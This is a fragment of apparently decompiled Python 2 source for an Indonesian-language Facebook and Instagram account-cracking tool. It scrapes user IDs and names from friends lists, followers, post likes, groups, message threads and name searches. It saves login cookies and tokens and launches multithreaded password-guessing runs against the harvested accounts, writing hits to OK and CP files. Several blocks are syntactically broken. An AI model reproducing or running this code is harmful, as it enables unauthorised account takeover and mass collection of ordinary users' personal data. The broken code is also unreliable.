        toket = open('data/token.txt', 'r').read()
    except IOError:
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m Token kadaluarsa'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()

    print '\n\n\n\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m=======================/--> PROFILL GUARD'
    print '\x1b[0;36m[\x1b[0;00m01\x1b[0;36m]\x1b[0;00m Hidupkan profill guard'
    print '\x1b[0;36m[\x1b[0;00m02\x1b[0;36m]\x1b[0;00m Matikan profill guard'
    print '\x1b[0;36m[\x1b[0;00m00\x1b[0;36m]\x1b[0;00m Back'
    turn()


def turn():
    g = raw_input('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Input : ')
    if g == '1' or g == '01':
        On = 'true'
        gaz(toket, On)
    elif g == '2' or g == '02':
        Off = 'false'
        gaz(toket, Off)
    elif g == '0' or g == '00':
        menu()
    elif g == '':
        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;31m Jangan kosonk')
        turn()
    else:
        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;31m Isi dengan benar')
        turn()


def get_userid(toket):
    url = 'https://graph.facebook.com/me?access_token=%s' % toket
    res = requests.get(url)
    uid = json.loads(res.text)
    return uid['id']


def gaz(toket, enable = True):
    id = get_userid(toket)
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Authorization': 'OAuth %s' % toket }
    url = 'https://graph.facebook.com/graphql'
    res = requests.post(url, data = data, headers = headers)
    print res.text
    if '"is_shielded":true' in res.text:
        print ''
        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Telah di aktifkan')
        raw_input('\n\x1b[0;36m[\x1b[0;00m ENTER \x1b[0;36m]')
        guard()
    elif '"is_shielded":false' in res.text:
        print ''
        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Berhasil di matikan')
        raw_input('\n\x1b[0;36m[\x1b[0;00m ENTER \x1b[0;36m]')
        guard()
    else:
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Eror asu'
        menu()


def menu_instag():
    global cookie
    
    try:
        jeeckxd = open('data/ig.txt', 'r').read()
    except IOError:
        masuk_ig()

    url = 'https://i.instagram.com/api/v1/friendships/12629128399/followers/?count=5'
    with requests.Session() as ses:
        
        try:
            otw = ses.get(url, cookies = {
                'cookie': jeeckxd }, headers = headerz_api)
            if 'users' in json.loads(otw.content):
                cookie = {
                    'cookie': jeeckxd }
            else:
                jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m Cookie Not Fallid ')
                jeda(2)
                os.system('rm -rf data/ig.txt')
                masuk_ig()
        except ValueError:
            jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m Cookie Not Fallid')
            jeda(2)
            os.system('rm -rf data/ig.txt')
            masuk_ig()



def masuk_ig():
    global cookie
    jeeck('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Jika ingin membuka VITUR INSTAGRAM anda harus login terlebih dahulu ')
    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;31m Disarankan masuk akun instagram menggunakan akun tumbal ')
    userrr = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Username : ')
    passxnxx = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Password : ')
    
    try:
        
        try:
            headerz = {
                'User-Agent': user_agentz }
            with requests.Session() as ses:
                scr = 'https://www.instagram.com/'
                data = ses.get(scr, headers = headerz).content
                toket = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
            headerss = {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.5',
                'Host': 'www.instagram.com',
                'X-CSRFToken': toket,
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.instagram.com/accounts/login/',
                'User-Agent': user_agentz }
            param = {
                'username': userrr,
                'enc_password': '#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(random.randint(1000000000, 0x2540BE3FFL), passxnxx),
                'optIntoOneTap': False,
                'queryParams': { },
                'stopDeletionNonce': '',
                'trustedDeviceRecords': { } }
        except:
            header = { }
            param = { }

        with requests.Session() as ses:
            url = 'https://www.instagram.com/accounts/login/ajax/'
            respon = ses.post(url, data = param, headers = headerss)
            data = json.loads(respon.content)
            _2 = respon.cookies.get_dict()
            if 'userId' in str(data):
                for jeeckxnano in _2:
                    with open('data/ig.txt', 'a') as simpan:
                        simpan.write(jeeckxnano + '=' + _2[jeeckxnano] + ';')
                
                jeeckxd = open('data/ig.txt', 'r').read()
                cookie = {
                    'data/ig.txt': jeeckxd }
                print ''
                jeda(2)
                jeeck('\x1b[0;36m[\x1b[0;31m>_\x1b[0;36m]\x1b[0;00m Logine berhasil tolong run tools kembali ')
                exit()
            elif 'checkpoint_url' in str(data):
                jeeck('\x1b[0;36m[\x1b[0;31m>_\x1b[0;36m]\x1b[0;00m Login eror')
                jeda(2)
            elif 'Please wait' in str(data):
                print '\x1b[0;36m[\x1b[0;31m>_\x1b[0;36m]\x1b[0;00m Hidupkan mode pesawat 2 detik'
            else:
                print '\x1b[0;36m[\x1b[0;31m>_\x1b[0;36m]\x1b[0;00m Login eror coba login lagi '
                exit()
    except KeyboardInterrupt:
        exit()


None

def publik(jeeckxd, headers = header):
    
    try:
        os.mkdir('dump')
    except:
        pass

    
    try:
        jeeck("\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Ketik \x1b[0;33m'me' \x1b[0;00mjika ingin dump id pertemanan sendiri")
        idt = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Id publik : ')
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s' % (idt, jeeckxd))
        nm = json.loads(gas.text)
        file = ('dump/' + nm['first_name'] + '.json').replace(' ', '_')
        jeeckxnano = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s' % (idt, jeeckxd))
        z = json.loads(r.text)
        for _x_ in z['friends']['data']:
            id.append(_x_['id'] + '<=>' + _x_['name'])
            jeeckxnano.write(_x_['id'] + '<=>' + _x_['name'] + '\n')
            print '\r\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Mengumpulkan id --> \x1b[0;36m%s ' % len(id),
            sys.stdout.flush()
            jeda(0.005)
        
        jeeckxnano.close()
        print '\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m File tersimpan di --> \x1b[0;36m%s ' % file
        raw_input('\x1b[0;36m[\x1b[0;00m ENTER \x1b[0;36m]')
        menu()
    except Exception:
        e = None
        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Kemungkinan akun mati / id tersebut privat ')
        exit()



def followers(jeeckxd, headers = header):
    
    try:
        os.mkdir('dump')
    except:
        pass

    
    try:
        jeeck("\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Ketik 'me' jika ingin dump id followers sendiri ")
        idt = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Target followers : ')
        batas = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Maximal ambil : ')
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s' % (idt, jeeckxd))
        nm = json.loads(gas.text)
        file = ('dump/' + nm['first_name'] + '.json').replace(' ', '_')
        jeeckxnano = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s' % (idt, batas, jeeckxd))
        z = json.loads(r.text)
        for _x_ in z['data']:
            id.append(_x_['id'] + '<=>' + _x_['name'])
            jeeckxnano.write(_x_['id'] + '<=>' + _x_['name'] + '\n')
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m mengumpulka id --> \x1b[0;36m%s ' % len(id),
            sys.stdout.flush()
            jeda(0.005)
        
        jeeckxnano.close()
        print '\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Berhasil ambil id tersebut : \x1b[0;36m%s ' % nm['name']
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m File di simpan di --> \x1b[0;36m%s ' % file
        raw_input('\n\n\n\x1b[0;36m[\x1b[0;00m ENTER \x1b[0;36m]')
        menu()
    except Exception:
        e = None
        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m akun kemungkian mati / id tersebut tidak di publikan')



def postingan(jeeckxd, headers = header):
    
    try:
        os.mkdir('dump')
    except:
        pass

    
    try:
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Dump id postingan :)'
        idt = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m Id post : ')
        simpan = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Nama buat file : ')
        r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s' % (idt, jeeckxd))
        id = []
        z = json.loads(r.text)
        file = ('dump/' + simpan + '.json').replace(' ', '_')
        jeeckxnano = open(file, 'w')
        for _x_ in z['data']:
            id.append(_x_['id'] + '<=>' + _x_['name'])
            jeeckxnano.write(_x_['id'] + '<=>' + _x_['name'] + '\n')
            print '\r\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Mengumpulkan id --> \x1b[0;36m%s' % str(len(id))
            sys.stdout.flush()
            jeda(0.005)
        
        jeeckxnano.close()
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m File.tersimpan di --> \x1b[0;36m%s' % file
        raw_input('\x1b[0;36m[\x1b[0;00m ENTER \x1b[0;36m]')
        menu()
    except Exception:
        e = None
        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Kemungkinan akun mati / id tersebut tidak di publikan')
        exit()



class group:
    
    def __init__(self, cookies):
        self.glist = []
        self.cookies = cookies
        self.manual()
        exit()

    
    def manual(self):
        id = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Id group : ')
        if id in '':
            self.manual()
        else:
            _r_ = bs4.BeautifulSoup(requests.get('https://mbasic.facebook.com/groups/' + id, headers = hdcok(), cookies = self.cookies).text, 'html.parser')
            if 'konten tidak' in _r_.find('title').text.lower():
                exit('Help Input Id Which Fallid Dog')
            else:
                self.listed = {
                    'id': id,
                    'name': _r_.find('title').text }
                self.jeeck_xnano_xx()
                print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Nama group --> \x1b[0;36m%s' % self.listed.get('name')[0:20]
                self.dumps('https://mbasic.facebook.com/groups/' + id)

    
    def jeeck_xnano_xx(self):
        self.fl = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Nama file --> %s' % B).replace(' ', '_')
        if self.fl == '':
            self.jeeck_xnano_xx()
        open(self.fl, 'w').close()

    
    def dumps(self, url):
        _r_ = bs4.BeautifulSoup(requests.get(url, cookies = self.cookies, headers = hdcok()).text, 'html.parser')
        print '\r\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Pengumpulan id --> \x1b[0;36m%s' % str(len(open(self.fl).read().splitlines()))
        sys.stdout.flush(bu)
        jeda(0.005)
        for _i_ in _r_.find_all('h3'):
            
            try:
                if len(bs4.re.findall('\\/', _i_.find('a', href = True).get('href'))) == 1:
                    ogeh = _i_.find('a', href = True)
                    if 'profile.php' in ogeh.get('href'):
                        _a_ = ''.join(bs4.re.findall('profile\\.php\\?id=(.*?)&', ogeh.get('href')))
                        if len(_a_) == 0:
                            continue
                        elif _a_ in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (_a_, ogeh.text))
                            continue
                    else:
                        _a_ = ''.join(bs4.re.findall('/(.*?)\\?', ogeh.get('href')))
                        if len(_a_) == 0:
                            continue
                        elif _a_ in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (_a_, ogeh.text))
            continue
            continue
            continue

        
        for _i_ in _r_.find_all('a', href = True):
            if 'Lihat Postingan Lainnya' in _i_.text:
                while True:
                    
                    try:
                        self.dumps('https://mbasic.facebook.com/' + _i_.get('href'))
                    continue
                    except Exception:
                        e = None
                        print '\r\x1b[1;91m[+]%s, retrying...' % e
                        continue
                        continue
                    

                continue
        print '\n\n%s[+] Succes dump id member group ' % (H,)
        print '%s[%s+%s]%s File dump Saved In %s-->%s %s ' % (B, J, B, P, M, H, self.fl)
        raw_input('\n%s[%s+%s] [%s Enter%s ] ' % (B, J, B, U, O))
        menu()



def cek(arg):
    if os.path.exists('data/cookies'):
        if os.path.getsize('data/cookies') != 0:
            return True
        return None
    return False


def dumpfl():
    cvds = None
    cookie = None
    new = None
    if cek(1) == False:
        
        try:
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Masukan cookie ya bro agar berjeeck '
            cookie = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Cookie : ')
            cvds = cvd(cookie)
            new = True
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Login gagal '
        dumpfl()

    else:
        cvds = cvd(open('data/cookies').read().strip())
    r = requests.get('https://mbasic.facebook.com/profile.php', cookies = cvds, headers = hdcok()).text
    if len(bs4.re.findall('logout', r)) != 0:
        if kueh(cvds) != True:
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Gagal njenk '
            exit()
        if new == True:
            open('data/cookies', 'w').write(cookie)
        sim = raw_input('\n%s[%s+%s] %sName File %s--> %s ' % (B, P, B, P, M, K)).replace(' ', '_')
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Contoh nama untuk di masukan [ Firman Syah ]'
        s = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Nama : ')
        if s in ('xnano', 'Xnano', 'XNANO', 'Xnano Jeeck', 'Xnano jeeck', 'XNANO JEECK', 'xnano jeeck'):
            print '\n%s[%s+%s] %sanak anjing mau crack pake nama gw ' % (B, P, B, P)
            exit()
        elif s in ('Xnano Jeeck', 'Xnano jeeck', 'XNANO JEECK', 'xnano jeeck'):
            print '\n%s[%s+%s] %sJeeck X Nano Xx Brutall' % (B, J, B, P)
            exit()
        namah(sim, cvds, 'https://mbasic.facebook.com/search/people/?q=' + s)
    else:
        
        try:
            os.remove('data/cookies')
        except:
            pass

        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Login eror ')
        dumpfl()


def namah(sim, r, b):
    open(sim, 'a+')
    b = bs4.BeautifulSoup(requests.get(b, cookies = r, headers = hdcok()).text, 'html.parser')
    for i in b.find_all('a', href = True):
        print '\r%s[%s+%s] %s Pengumpulan id %s--> %s%s ' % (B, P, B, P, P, K, str(len(open(sim).read().splitlines()))),
        sys.stdout.flush()
        if '<img alt=' in str(i):
            if 'home.php' in str(i['href']):
                continue
            else:
                g = str(i['href'])
                if 'profile.php' in g:
                    name = i.find('img').get('alt').replace(', profile picture', '')
                    d = bs4.re.findall('/profile\\.php\\?id=(.*?)&', g)
                    if len(d) != 0:
                        pk = ''.join(d)
                        if pk in open(sim).read():
                            pass
                        else:
                            open(sim, 'a+').write('%s<=>%s\n' % (pk, name))
                    
                else:
                    d = bs4.re.findall('/(.*?)\\?', g)
                    name = i.find('img').get('alt').replace(', profile picture', '')
                    if len(d) != 0:
                        pk = ''.join(d)
                        if pk in open(sim).read():
                            pass
                        else:
                            open(sim, 'a+').write('%s<=>%s\n' % (pk, name))
                    
        if 'Lihat Hasil Selanjutnya' in i.text:
            namah(sim, r, i['href'])
            continue
    print '\n\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Berhasil mengambil id dari nama '
    print '%s[%s+%s]%s File di simpan di %s-->%s %s ' % (B, p, B, P, M, H, sim)
    raw_input('\n%s[%s+%s] [%s Enter%s ] ' % (B, P, B, U, O))
    menu()


class pesan:
    
    def __init__(self, cookies):
        self.cookies = cookies
        self.f = raw_input('\n%s[%s+%s] Nama file %s --> \x1b[0;36m%s ' % (B, P, B, M, K)).replace(' ', '_')
        if self.f == '':
            pesan(cookies)
        open(self.f, 'w').close()
        self.dump('https://mbasic.facebook.com/messages')

    
    def dump(self, url):
        open(self.f, 'a+')
        bs = bs4.BeautifulSoup(requests.get(url, headers = hdcok(), cookies = self.cookies).text, 'html.parser')
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Mengumpulkan id --> \x1b[0;36m%s ' % str(len(open(self.f).read().splitlines()))
        sys.stdout.flush()
        jeda(0.005)
        for i in bs.find_all('a', href = True):
            if '/messages/read' in i.get('href'):
                f = bs4.re.findall('cid\\.c\\.(.*?)%3A(.*?)&', i.get('href'))
                
                try:
                    for ip in list(f.pop()):
                        if self.cookies.get(' c_user') in ip:
                            continue
                            continue
                        if 'pengguna facebook' in i.text.lower():
                            continue
                        open(self.f, 'a+').write('%s<=>%s\n' % (ip, i.text))
                except Exception:
                    e = None
                    continue
                

            if 'Lihat Pesan Sebelumnya' in i.text:
                self.dump('https://mbasic.facebook.com/' + i.get('href'))
                continue
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m File tersimpan di --> \x1b[0;36m%s ' % self.f
        raw_input('\n\n\n\n\x1b[0;36m[\x1b[0;00m ENTER \x1b[0;36m]')
        menu()



def r_ikut(cookie, id_target, limit, lpg):
    global looping
    if lpg in ('',):
        print '\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Isi dengan benar'
        exit()
    elif lpg in ('1', '01'):
        url = 'https://i.instagram.com/api/v1/friendships/{}/followers/?count={}'.format(id_target, limit)
    elif lpg in ('2', '02'):
        url = 'https://i.instagram.com/api/v1/friendships/{}/following/?count={}'.format(id_target, limit)
    else:
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Isi dengan benar '
        exit()
    with requests.Session() as ses:
        otw = ses.get(url, cookies = cookie, headers = headerz_api)
        for _j_ in json.loads(otw.content)['users']:
            username = _j_['username']
            nama = _j_['full_name'].encode('utf-8')
            if len(status_foll) != 1:
                print '\r\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Total --> \x1b[0;36m%s ' % len(mi),
                sys.stdout.flush()
                mi.append(username + '|' + nama.decode('utf-8'))
                looping += 1
                continue
            poll.append(username)

None
ugent = random.choice([
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)',
    'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
    'NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)',
    'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2',
    'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]',
    'Mozilla/5.0 (Linux; Android 7.0; MHA-L29 Build/HUAWEIMHA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/96.0.0.45.70;FBBV/60548545;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/E-Plus;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]',
    'Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]',
    'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]',
    'Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
    '[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]'])

def useragent():
    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m --> Fitur [ USER AGENT ]\n\n')
    print '\x1b[0;36m[\x1b[0;00m01\x1b[0;36m]\x1b[0;00m Ganti user-agent'
    print '\x1b[0;36m[\x1b[0;00m02\x1b[0;36m]\x1b[0;00m Cek user-agent sekarang'
    print '\x1b[0;36m[\x1b[0;00m00\x1b[0;36m]\x1b[0;00m Kembali ke MENU'
    _jeeclxnano = raw_input('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Input : ')
    uas(_jeeclxnano)


def uas(_jeeclxnano):
    if _jeeclxnano == '':
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Isi Dengan benar ya bangsat '
        jeda(2)
        uas(_jeeclxnano)
    elif _jeeclxnano in ('1', '01'):
        jeeck("\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Ketik 'JEECK' untuk seting user-agent defaults")
        
        try:
            ua = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m User-agent : ')
            if ua in '':
                print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Isi dengan benar'
                jeda(2)
                menu()
            elif ua in ('JEECK', 'jeeck', 'Jeeck'):
                ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
                open('data/ua.txt', 'w').write(ua_)
                jeda(2)
                jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Bsrhasil mengganti')
                jeda(2)
                menu()
            open('data/ua.txt', 'w').write(ua)
            jeda(2)
            jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Berhasil mengganti ')
            jeda(2)
            menu()
        except KeyboardInterrupt:
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Gagal mengganti '
            exit()
        

    if _jeeclxnano in ('2', '02'):
        
        try:
            ua_ = open('data/ua.txt', 'r').read()
            jeda(2)
            print '%s%s%s User-agent sekarang  --> %s%s' % (U, til, O, H, ua_)
            jeda(2)
            raw_input('\n%s%s%s [%s Enter%s ] ' % (U, til, O, U, O))
            menu()
        except IOError:
            ua_ = '%s-' % M
        

    if _jeeclxnano in ('0', '00'):
        menu()
    else:
        jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m Wronk Cook ')
        jeda(2)
        uas(_jeeclxnano)


class jeckoramadhanganteng:
    
    def __init__(self):
        self.id = []

    
    def jeeckxtampany(self):
        
        try:
            self.apk = raw_input('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Nama file  hasil dump : ')
            self.id = open(self.apk).read().splitlines()
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Total id --> \x1b[0;36m%s ' % len(self.id)
        except:
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m File tidak di temukan / kosong '
            raw_input('\x1b[0;36m[\x1b[0;00mENTER\x1b[0;36m]')
            menu()

        je = raw_input('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Ingin menggunakan password manual/otomatis (Y/O) : ')
        if je in ('Y', 'y'):
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Contoh password ( jeeckgantenk,jecko12345,anjinklubabi)'
            while True:
                pwx = raw_input('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Password : ')
                if pwx == '':
                    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Jangan kosong ')
                    continue
                if len(pwx) <= 5:
                    print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Password masimal 6 karakter'
                    continue
                
                def manual(brute = (None, None)):
                    ind = raw_input('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Input : ')
                    if ind == '':
                        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Isi Dengan benar'
                        manual()
                    elif ind in ('1', '01'):
                        print '\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Results OK di simpan di --> \x1b[0;36mOK/%s.txt' % waktu
                        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Results CP di simpan di --> \x1b[0;36mCP/%s.txt' % waktu
                        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m Jika 100 aktifkan mode pesawat 2 detik\n\n\n'
                        with ThreadPoolExecutor(max_workers = 30) as log:
                            for akun in self.id:
                                
                                try:
                                    _heck_ = akun.split('<=>')[0]
                                    log.submit(self.b_api, _heck_, brute)
                                continue
                                continue

                        os.remove(self.apk)
                        exit('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m Crack selesai >_')
                    elif ind in ('2', '02'):
                        print '\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Results OK di simpan di -->\x1b[0;36m OK/%s.txt' % waktu
                        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Results CP di simpan di -->\x1b[0;36m CP/%s.txt' % waktu
                        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;31 On Of mode pesawat jika tidak ada hasil')
                        with ThreadPoolExecutor(max_workers = 30) as log:
                            for akun in self.id:
                                
                                try:
                                    _heck_ = akun.split('<=>')[0]
                                    log.submit(self.basic, _heck_, brute)
                                continue
                                continue

                        os.remove(self.apk)
                        exit('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m FINISED')
                    elif ind in ('4', '04'):
                        print '\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Results OK di simpan di --> \x1b[0;36mOK/%s.txt' % waktu
                        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Results CP di simpan di -->\x1b[0;36m CP/%s.txt' % waktu
                        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;31m On Of mode pesawat jika tidak ada hasil')
